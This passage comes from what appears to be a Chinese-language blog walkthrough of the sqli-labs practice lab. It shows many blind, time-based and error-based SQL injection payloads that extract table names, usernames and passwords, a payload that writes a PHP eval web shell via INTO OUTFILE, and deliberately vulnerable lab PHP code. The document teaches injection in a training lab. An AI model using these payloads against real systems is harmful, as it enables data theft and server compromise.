src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183102013.png" class><p><code>接下来进行爆第一张表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&#x27;em&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),6)=&#x27;emails&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183326285.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101183525900.png" class><p><code>爆出第四张表为users，接下来进行爆列名</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure><p><code>第一个列名为id</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222734437.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure><p><code>第二个与第三个列名为username、password</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222533544.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222604381.png" class><p><code>爆数据即username与password字段的内容</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select username from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185002099.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and left((select password from users limit 0,1),4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101185116009.png" class><p><strong>也可以使用substr截断函数进行爆库、爆表、爆字段</strong></p><blockquote><p>substr函数与limit不同，截取第一个字符为从1开始，而limit从0开始</p></blockquote><p><code>爆库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),2,1)=&#x27;e&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),3,1)=&#x27;c&#x27; -- -</span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr(database(),4,1)=&#x27;u&#x27; -- -</span><br><span class="line">// 同样可以使用intruder进行爆破</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102204726445.png" class><p><code>也可以使用ASCII进行查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and ord(substr(database(),1,1))=115 -- -</span><br><span class="line">// ord为ASCII转换函数，s的ASCII值为115。</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205332810.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205349191.png" class><p><code>爆表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)=&#x27;u&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,2)=&#x27;us&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,3)=&#x27;use&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,4)=&#x27;user&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,5)=&#x27;users&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102205811674.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102210130815.png" class><p><code>爆字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1,2)=&#x27;id&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102222854581.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 1,1),1,8)=&#x27;username&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 2,1),1,8)=&#x27;password&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223125374.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223201941.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,1)=&#x27;d&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select username from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and substr((select password from users limit 0,1),1,4)=&#x27;dumb&#x27; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223440143.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210102223459949.png" class><p><strong><em>skip：这种方法就是比较麻烦，累傻小子的活建议sqlmap💂‍♀️</em></strong></p><h3 id="3-第三种方法-利用时间延时注入"><a href="#3-第三种方法-利用时间延时注入" class="headerlink" title="3.第三种方法(利用时间延时注入)"></a>3.第三种方法(利用时间延时注入)</h3><p><code>爆库名长度，这里依旧可以使用intruder</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(length(database())=8,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101190911402.png" class><p><code>爆库</code></p><p><code>也可以将length()换为substr()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/id=1&#x27; and if(left(database(),8)=&#x27;security&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191846689.png" class><p><code>爆表，第四张表为users</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#x27;e&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;users&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101191536441.png" class><p><code>爆users表的字段</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),8)=&#x27;id&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192412154.png" class><p><code>第二个字段与第三个字段为username、password</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),8)=&#x27;username&#x27;,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),8)=&#x27;password&#x27;,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192640873.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101192551041.png" class><p><code>爆数据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select username from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br><span class="line"></span><br><span class="line">http://192.168.1.100/sqli/Less-5/?id=1&#x27; and if(left((select password from users limit 0,1),4)=&#x27;dumb&#x27; ,sleep(5),1)-- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193118321.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101193031194.png" class><p><strong><em>skip：同样使用intruder进行爆破是一个不错的手段</em></strong></p><h2 id="0x06-Less-6-GET-双注入-双引号"><a href="#0x06-Less-6-GET-双注入-双引号" class="headerlink" title="0x06.Less-6 GET 双注入 双引号"></a>0x06.Less-6 GET 双注入 双引号</h2><p><code>同Less5，将单引号换为双引号即可</code></p><h2 id="0x07-Less-7-GET-Dump函数-导出文件"><a href="#0x07-Less-7-GET-Dump函数-导出文件" class="headerlink" title="0x07.Less-7 GET Dump函数 导出文件"></a>0x07.Less-7 GET Dump函数 导出文件</h2><p><code>首先需要知道web后台的路径格式，这里使用Less-1，菜狗的我没有想到其他好办法.....</code></p><blockquote><p>IIS默认路径是    C:\Inetpub\wwwroot</p><p>nginx一般是    /usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等</p><p>apache是    /var/www/html，/var/www/html/htdocs</p><p>phpstudy 就是    \PhpStudy\WWW\</p><p>xammp 就是    \xampp\htdocs</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-1/?id=0&#x27; union select 1,@@basedir,@@datadir -- -</span><br></pre></td></tr></table></figure><blockquote><p>其中basedir为MySQL 的安装路径，datadir为MySQL 的数据库文件路径</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101215105882.png" class><p><code>可以猜到web路径为C:\phpstudy\www，之后就可以上传文件</code></p><p><code>这里已经探测到闭合字符为&#39;))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100/sqli/Less-7/?id=0&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;demo&quot;]);?&gt;&#x27; into outfile &quot;C:\\phpStudy\\www\\sqli\\less-7\\demo.php&quot; -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220528860.png" class><p><code>访问demo.php查看文件是否上传成功</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220623654.png" class><p><code>上传成功，蚁剑连接</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210101220848719.png" class><h2 id="0x08-Less-8-GET-基于bool-盲注-单引号"><a href="#0x08-Less-8-GET-基于bool-盲注-单引号" class="headerlink" title="0x08.Less-8 GET 基于bool 盲注 单引号"></a>0x08.Less-8 GET 基于bool 盲注 单引号</h2><blockquote><p>同Less5 方法二</p></blockquote><h2 id="0x09-Less-9-GET-基于时间-盲注-单引号"><a href="#0x09-Less-9-GET-基于时间-盲注-单引号" class="headerlink" title="0x09.Less-9 GET 基于时间 盲注 单引号"></a>0x09.Less-9 GET 基于时间 盲注 单引号</h2><p><code>无论输入什么都只有You are in...</code></p><blockquote><p>同Less5 方法三</p></blockquote><h2 id="0x010-Less-10-GET-基于时间-盲注-双引号"><a href="#0x010-Less-10-GET-基于时间-盲注-双引号" class="headerlink" title="0x010.Less-10 GET 基于时间 盲注 双引号"></a>0x010.Less-10 GET 基于时间 盲注 双引号</h2><blockquote><p>同Less9，将单引号换为双引号</p></blockquote><h2 id="0x011-Less-11-POST-基于报错-单引号"><a href="#0x011-Less-11-POST-基于报错-单引号" class="headerlink" title="0x011.Less-11 POST 基于报错 单引号"></a>0x011.Less-11 POST 基于报错 单引号</h2><p><code>uname存在注入</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100217440.png" class><p><code>测试发现只存在两个字段</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100626749.png" class><p><code>举个栗子</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110100826775.png" class><blockquote><p>其他方法如Less-1</p></blockquote><h2 id="0x12-Less-12-POST-基于报错-双引号-括号"><a href="#0x12-Less-12-POST-基于报错-双引号-括号" class="headerlink" title="0x12.Less-12 POST 基于报错 双引号+括号"></a>0x12.Less-12 POST 基于报错 双引号+括号</h2><p><code>同Less-11，只需要将单引号换为双引号加括号即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) -- -&amp;passwd=pass&amp;submit=Submit</span><br></pre></td></tr></table></figure><h2 id="0x13-Less-13-POST-双注入-单引号-括号"><a href="#0x13-Less-13-POST-双注入-单引号-括号" class="headerlink" title="0x13.Less-13 POST 双注入 单引号+括号"></a>0x13.Less-13 POST 双注入 单引号+括号</h2><p><code>同Less-5</code></p><blockquote><p>方法一、二、三均可用</p></blockquote><p><code>方法1</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110042606.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110103120999.png" class><p><code>方法二</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110308320.png" class><p><code>方法三</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110110528568.png" class><h2 id="0x14-Less-14-POST-双注入-双引号"><a href="#0x14-Less-14-POST-双注入-双引号" class="headerlink" title="0x14.Less-14 POST 双注入 双引号"></a>0x14.Less-14 POST 双注入 双引号</h2><blockquote><p>同Less-13，将单引号+括号换为双引号即可</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111000136.png" class><h2 id="0x15-Less-15-POST-基于时间-bool盲注-单引号"><a href="#0x15-Less-15-POST-基于时间-bool盲注-单引号" class="headerlink" title="0x15.Less-15 POST 基于时间/bool盲注 单引号"></a>0x15.Less-15 POST 基于时间/bool盲注 单引号</h2><p><code>同Less-5的方法二与方法三</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111527544.png" class><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110111652045.png" class><h2 id="0x16-Less-1-POST-基于时间-bool盲注-双引号-括号"><a href="#0x16-Less-1-POST-基于时间-bool盲注-双引号-括号" class="headerlink" title="0x16.Less-1 POST 基于时间/bool盲注 双引号+括号"></a>0x16.Less-1 POST 基于时间/bool盲注 双引号+括号</h2><blockquote><p>同Less-15，将单引号换为双引号+括号即可</p></blockquote><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110112154590.png" class><h2 id="0x17-Less-17-POST-基于错误-更新查询"><a href="#0x17-Less-17-POST-基于错误-更新查询" class="headerlink" title="0x17.Less-17 POST 基于错误 更新查询"></a>0x17.Less-17 POST 基于错误 更新查询</h2><p><code>查看源码发现，当uname的值后面有特殊符号会加上一个/进行转义</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line">$passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>根据题目提示与源码推测passwd为注入点</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110114238770.png" class><p><code>payload同Less-5的方法一</code></p><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110120051232.png" class><p><code>这里直接使用以下payload会报错，users不能被修改</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122233780.png" class><p><code>对payload进行嵌套，修改为如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as demo),0x7e),1) -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/10/Sqli-labs-Page1-basic/image-20210110122126131.png" class><p><code>其他注入不在赘述</code></p><h2 id="0x18-Less-18-POST-基于报错-HTTP请求头-Uagent-field"><a href="#0x18-Less-18-POST-基于报错-HTTP请求头-Uagent-field" class="headerlink" title="0x18.Less-18 POST 基于报错 HTTP请求头 Uagent-field"></a>0x18.Less-18 POST 基于报错 HTTP请求头 Uagent-field</h2><p><code>查看源码</code></p><blockquote><p>可以发现，这里的$uname与$passwd都做了过滤，即当存在特殊字符时加上/进行转义</p><p>并且insert函数将Uagent插入到了数据库</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $uagent = $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    $IP = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">//echo &#x27;Your User Agent is: &#x27; .$uagent;</span></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    $uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Your User name:&#x27;. $uname;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your Password:&#x27;. $passwd;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $uagent;</span></span><br><span class="line"><span class="comment">    echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    echo &#x27;Your User Agent String:&#x27;. $IP;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//logging the connection parameters to a file for analysis.    </span></span><br><span class="line">    $fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite($fp,<span class="string">&#x27;User Agent:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    fclose($fp);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    $sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">    $result1 = mysql_query($sql);</span><br><span class="line">    $row1 = 